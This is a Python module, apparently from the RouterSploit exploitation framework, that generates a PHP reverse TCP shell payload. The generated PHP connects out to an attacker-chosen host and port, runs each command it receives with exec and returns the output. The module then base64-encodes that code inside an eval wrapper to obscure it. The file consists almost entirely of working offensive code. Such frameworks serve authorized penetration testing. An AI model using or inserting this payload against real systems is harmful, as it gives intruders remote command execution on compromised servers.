from base64 import b64encode
from routersploit.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Exploit(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "PHP Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using php.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    def generate(self):
        payload = (
            "$s=fsockopen(\"tcp://{}\",{});".format(self.lhost, self.lport) +
            "while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}"
        )

        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
        return "eval(base64_decode('{}'));".format(encoded_payload)
